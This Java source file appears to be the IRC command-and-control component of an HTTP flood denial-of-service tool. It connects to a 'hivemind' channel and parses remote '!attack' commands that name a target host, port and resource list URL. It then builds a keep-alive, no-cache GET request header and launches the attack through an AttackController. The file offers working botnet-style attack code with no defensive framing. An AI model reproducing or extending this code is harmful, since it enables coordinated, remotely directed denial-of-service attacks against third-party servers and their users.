package hardroq.controllers;

import hardroq.networking.IRCConnection;

import java.io.File;
import java.net.URL;

public class HivemindController {
	private static HivemindController _instance = new HivemindController();
	private HivemindController() {}
	
	//internals
	private String server;
	private String nick;
	private String channel;
	private IRCConnection bot;
	
	public static HivemindController getInstance() {
		return _instance;
	}
	
	public void connectToHivemind() {
		try {
			bot = new IRCConnection(server, nick, channel);
		} catch (Exception e) {}
	}
	
	public void setServer(final String s) {
		server = s;
	}
	
	public void setNick(final String n) {
		nick = n;
	}
	
	public void setChannel(final String c) {
		channel = c;
	}
	
	public void parseCommand(final String command) throws Exception {
		if (command.startsWith("!"))
		{
			int spPos = command.indexOf(" ");
			final String c = command.substring(0, spPos).toLowerCase();
			final String[] vars = command.substring(spPos).split(" ");
			
			if (c.startsWith("!attack")) {
				//we have an attack command
				//let's continue to parse the rest of the string to figure out our variables
				for (int i = 0; i < vars.length; i++)
				{
					if (vars[i].startsWith("targethost"))
						AttackController.getInstance().setTarget(getCommandValue(vars[i]));
					else if (vars[i].startsWith("port"))
						AttackController.getInstance().setPort(Integer.parseInt(getCommandValue(vars[i])));
					else if (vars[i].startsWith("resourceurl"))
					    AttackController.getInstance().LoadResourceList(new URL(getCommandValue(vars[i])));
				}
				
				//let's just hardcode this shit for now...
	            String h = "";
	            h += "GET _targeturl_ HTTP/1.1\r\n";
	            h += "Host: " + AttackController.getInstance().getHost() + ":" + String.valueOf(AttackController.getInstance().getPort()) + "\r\n";
	            h += "Connection: keep-alive\r\n";
	            h += "Cache-Control: no-cache, must-revalidate\r\n";
	            h += "\r\n";
	            
	            AttackController.getInstance().setAttackHeader(h);
				
	            if (AttackController.getInstance().isAttacking()) {
	                AttackController.getInstance().EndAttack();
	                Thread.sleep(1000);
	            }
	            
				//ATTACK!
				AttackController.getInstance().Attack();
			} else if (c.startsWith("!settargethost"))
				AttackController.getInstance().setTarget(vars[0]);
			else if (c.startsWith("!setport"))
				AttackController.getInstance().setPort(Integer.parseInt(vars[1]));
		}
	}

    private String getCommandValue(final String string) {
        return string.substring(string.indexOf("=") + 1);
    }
}
